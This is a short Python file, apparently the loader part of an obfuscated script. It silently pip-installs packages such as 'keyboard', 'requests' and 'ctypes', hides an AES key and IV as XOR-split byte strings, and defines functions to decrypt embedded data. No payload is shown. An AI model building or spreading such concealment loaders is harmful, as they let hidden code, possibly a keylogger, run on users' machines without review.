
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['ujson', 'httpx', 'typing', 'hashlib', 'os', 'datetime', 'subprocess', 'rich', 'dataclasses', 'asyncio', 'ctypes', 'requests', 'keyboard']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b"\xa9\xb4'\x98\xbb0dYd\xd7+_\x85\xaa\xf9\x8b\x99\xa2\xfboR\xdc\x0bK$H\x8a\xf1\xe7\x12S\xa2", b'"8v\x8cO\xea6a\x8e\xb5\xa3\xd9]\xd1t\xa3f\xb6\xcf\xc2Q\\\xaeE\n\xea4\xbd\xc2}te', b"\xa3\xc2\x81qV\x1f\xc4\x9f\xea'\x1c\x1a\xf5C\xb5\x8d\xc5qQ\xac\x9c\xf80n\xd1\x08\xd9p\x19\xbc\x9c$"])
_I = _xor([b'\x82\xc5\xaaz\xca\x19\x7fR\xf2,x\x93\x06\xb3\xa5\x07', b'\xe1D\xfa\xd2\xaa\xf1\xf6.\x10\xe3\x7f%\rj\xc2\xe6'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

